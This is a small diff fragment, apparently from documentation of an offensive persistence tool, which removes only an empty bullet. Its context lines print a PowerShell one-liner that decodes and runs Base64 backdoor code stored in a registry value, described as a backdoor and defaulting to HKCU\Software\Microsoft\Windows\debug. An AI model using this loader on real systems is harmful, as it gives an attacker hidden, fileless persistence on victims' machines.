@@ -129,4 +129,3 @@
     [System.Diagnostics.Process]::Start("C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe");IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp <registry key>).debug)))
     ```
     * Backdoor code contained in the specified registry key. Default is `HKCU\Software\Microsoft\Windows\debug
-* 
